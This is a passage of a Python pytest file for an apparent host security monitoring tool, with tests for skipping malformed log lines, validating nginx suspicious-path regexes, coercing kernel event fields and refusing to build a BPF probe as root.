        local_timezone=timezone.utc,
        nginx_paths=[],
        nginx_path_patterns=[],
        logger=logging.getLogger(__name__),
    )

    assert len(records) == 2
    assert "skipped 1 malformed log line(s)" in caplog.text


def test_main_rejects_invalid_nginx_regex_in_config():
    """An invalid suspicious_path_patterns regex should raise a clear error."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test.db"
        config_path = Path(tmpdir) / "config.yaml"

        config_path.write_text(
            """
nginx:
  suspicious_path_patterns:
    - "(["
"""
        )

        import sys
        original_argv = sys.argv
        try:
            sys.argv = [
                "main.py",
                "--config", str(config_path),
                "--db-path", str(db_path),
                "--status",
            ]
            with pytest.raises(
                ValueError, match="nginx.suspicious_path_patterns"
            ):
                main()
        finally:
            sys.argv = original_argv


def test_normalize_kernel_events_coerces_int_fields():
    """String int fields in raw loader events should be coerced or become None."""
    events = _normalize_kernel_events(
        [
            {
                "event_type": "kernel_module_load",
                "pid": "4321",
                "tgid": "4321",
                "comm": "insmod",
                "uid": "0",
                "ppid": 1,
                "data": "evilmod",
            },
            {"event_type": "execve", "pid": "not-a-number"},
        ],
        run_id="run-1",
        timestamp=datetime(2026, 3, 25, 10, 0, 0),
    )

    assert events[0].pid == 4321
    assert events[0].tgid == 4321
    assert events[0].uid == 0
    assert events[1].pid is None


def test_build_bpf_probe_refuses_to_build_as_root(monkeypatch):
    """--build-bpf must not run make as root in a user-writable tree."""
    from traxerax_lite.main import _build_bpf_probe

    monkeypatch.setattr("traxerax_lite.main.os.geteuid", lambda: 0)
    logger = logging.getLogger("test")

    with pytest.raises(SystemExit, match="refusing to build"):
        _build_bpf_probe(logger)
